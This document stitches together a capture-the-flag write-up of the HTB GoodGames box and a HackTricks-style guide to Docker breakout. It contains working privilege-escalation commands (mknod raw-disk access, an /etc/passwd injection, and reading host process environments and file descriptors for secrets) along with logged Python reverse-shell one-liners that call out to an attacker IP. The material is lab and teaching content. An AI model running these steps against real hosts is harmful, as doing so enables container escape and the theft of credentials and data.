

##
#
https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/
#
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation
#
##

   Unintended3 path for privilege escalation
Now we have to make a decision: we can try to solve it the easy way, or we can try to solve it the difficult way. Naturally I decided to go for the difficult way.4

We have the following situation:

Root in the Docker
User in the host
I searched online for a privilege escalation method for this and I found the following article.

It described a way of being able to read /dev/sda using the mknod command. I decided to exactly reproduce the following image of the blog:5



Get another reverse shell in docker as root (send the Burp request again with a different port)
Run mknod sda b 8 0, chmod 777 sda, add augustus and su to augustus to open a /bin/sh session in the Docker:
# cd /
cd /
# mknod sda b 8 0
mknod sda b 8 0
# chmod 777 sda
chmod 777 sda
```
# echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# su augustus
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$ 
On the host check the process ID of the /bin/sh shell in the Docker:
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh
The process ID is 1659 in this case
Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda 
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
HTB{M0un73d_F1l3_Sy57eM5_4r3_DaNg3R0uS}
```
grep: memory exhausted
augustus@GoodGames:~$ 
And this gives both flags after a short amount of time.

The --exclude-length was required since the website always respond with a 200 status code while it is actually a 404 ↩︎

This payload is copied from the “Exploit the SSTI by calling Popen without guessing the offset” payload at Hacktricks. In my experience, this one works the best. ↩︎

I shared this method in the Discord and there I heard that this was not the intended way of getting the root flag ↩︎

Actually, I did not really think of copying /bin/bash to the home directory of augustus, setting the SUID bit, changing owner to root and run the binary as augustus on the host so you end up with an easy privilege escalation. This would have been the easy path. ↩︎

On the left you can see the shell in the Docker container. On the right the shell in the host. ↩︎



Privilege Escalation with 2 shells
If you have access as root inside a container and you have escaped as a non privileged user to the host, you can abuse both shells to privesc inside the host if you have the capability MKNOD inside the container (it's by default) as explained in this post.
With such capability the root user within the container is allowed to create block device files. Device files are special files that are used to access underlying hardware & kernel modules. For example, the /dev/sda block device file gives access to read the raw data on the systems disk.

Docker safeguards against block device misuse within containers by enforcing a cgroup policy that blocks block device read/write operations. Nevertheless, if a block device is created inside the container, it becomes accessible from outside the container via the /proc/PID/root/ directory. This access requires the process owner to be the same both inside and outside the container.

Exploitation example from this writeup:

Copy
```
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda
```

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)

```
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$ 
Copy
```
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda 
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
hostPID
If you can access the processes of the host you are going to be able to access a lot of sensitive information stored in those processes. Run test lab:

Copy
docker run --rm -it --pid=host ubuntu bash
For example, you will be able to list the processes using something like ps auxn and search for sensitive details in the commands.

Then, as you can access each process of the host in /proc/ you can just steal their env secrets running:
```
Copy
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
You can also access other processes file descriptors and read their open files:

Copy
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```

You can also kill processes and cause a DoS.

If you somehow have privileged access over a process outside of the container, you could run something like nsenter --target <pid> --all or nsenter --target <pid> --mount --net --pid --cgroup to run a shell with the same ns restrictions (hopefully none) as that process.

hostNetwork
Copy
docker run --rm -it --network=host ubuntu bash
If a container was configured with the Docker host networking driver (--network=host), that container's network stack is not isolated from the Docker host (the container shares the host's networking namespace), and the container does not get its own IP-address allocated. In other words, the container binds all services directly to the host's IP. Furthermore the container can intercept ALL network traffic that the host is sending and receiving on shared interface tcpdump -i eth0.

For instance, you can use this to sniff and even spoof traffic between host and metadata instance.

Like in the following examples:

Writeup: How to contact Google SRE: Dropping a shell in cloud SQL

Metadata service MITM allows root privilege escalation (EKS / GKE)

You will be able also to access network services binded to localhost inside the host or even access the metadata permissions of the node (which might be different those a container can access).

hostIPC
Copy
docker run --rm -it --ipc=host ubuntu bash
With hostIPC=true, you gain access to the host's inter-process communication (IPC) resources, such as shared memory in /dev/shm. This allows reading/writing where the same IPC resources are used by other host or pod processes. Use ipcs to inspect these IPC mechanisms further.

Inspect /dev/shm - Look for any files in this shared memory location: ls -la /dev/shm

Inspect existing IPC facilities – You can check to see if any IPC facilities are being used with /usr/bin/ipcs. Check it with: ipcs -a


